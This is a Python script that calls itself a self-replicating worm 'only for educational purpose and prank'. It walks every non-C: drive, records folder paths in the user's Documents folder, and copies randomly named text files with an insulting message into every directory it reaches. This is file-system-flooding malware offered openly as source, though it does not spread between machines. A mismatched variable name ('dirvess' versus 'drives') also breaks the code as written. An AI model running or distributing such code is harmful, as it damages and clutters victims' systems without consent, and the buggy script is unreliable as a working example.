'''
    
    **********        O N L Y     F O R      E D U C A T I O N A L        P U R P O S E       ***********

    This python program is a self replicating worm ONLY FOR EDUCATIONAL PURPOSE and prank. 
    This is really really harms the whole system. 
    This replicates textfiles itself through all the directories and folders and copies the path traversed to a textfile mentioned.
    The name of the file is randomized according to the users wish and the content inside that file is also specified by user.
    Use it with caution.!! THIS JUST TAKES AROUND 5 SECONDS TO TRAVERSE A NORMAL PC.
'''



import os                   #For directory names
import shutil               #For copyin files
import random               #For randomizing string
import getpass              #For username of PC
import win32api             #For disk drives characters

username = getpass.getuser()        #Getting username

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)    #Getting directory list
    allFiles = list()
                                        # Iterate over all the entries
    for entry in listOfFile:
        if entry=="System Volume Information" or entry=="Programs" or entry=="InfusedApps":         #Optional for C: drive
            continue 
        fullPath = os.path.join(dirName, entry)             # Create full path
        if os.path.isdir(fullPath):         #If directory the get subfiles
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)                    
    return allFiles        
 
 
def main():
    
    dirvess = win32api.GetLogicalDriveStrings()         #Disk drives 
    drivess = drives.split('\000')[:-1]                 #On characters enough
    random.shuffle(drivess)                             #huffling the drive list
    drivess.remove("C:\\")                              #Removing C drive since permission issues takes place and C contains alot of subfolders
    for i in drivess:                                   #Iterating through each drives
        dirName = i
        filenamenew="KCFU"                              #Name of the replicating file
    
        listOfFiles = getListOfFiles(dirName)

        z="C:\\Users\\"+username+"\\Documents\\temp_list.txt"       #Redundant list
        zz="C:\\Users\\"+username+"\\Documents\\final_list.txt"     #Non-duplicant list
        zzz="C:\\Users\\"+username+"\\Documents"                    #The final replicating file
    
        for elem in listOfFiles:                    #Each folder traversing
            f = open(z, "a")                        
            x=elem.rfind("\\")                      #Finding the last slash
            y=elem[0:x]                             #Removing name after the last slash and saving its folder alone
            f.write(y+"\n")                         #Writing name of folder to the file
            f.close()
        open(zz,'w').writelines(set(open(z,'r').readlines()))       #Set maintaing only non-duplicate values
    

        f3=open(zz,'r')
        for directoriess in f3: 
            yyy=''.join(random.sample(filenamenew,len(filenamenew)))    #Randomizing the filename
            temp=zzz+"\\"+yyy+".txt"                                    #Filepath with randomised filename
            f2=open(temp,'w')                           
            f2.write("\n\n\n\n\t\t\t\t\t\tWHOLE WORLD IS PURELY SHITTY and THE PEOPLE ARE THE SHITTIEST")                                           #Content inside file
            f2.close()
            xxx=directoriess[0:-1]
            try:
                shutil.copy2(temp, xxx)                                 #Copying file into folders
            except shutil.SameFileError:                                #Exception if already same name file available
                continue
            except PermissionError:                                     #Exception if permission not granted
                continue
            except IsADirectoryError:                                   #If error in directory
                continue
            except: 
                continue
       
if __name__ == '__main__':
    main()
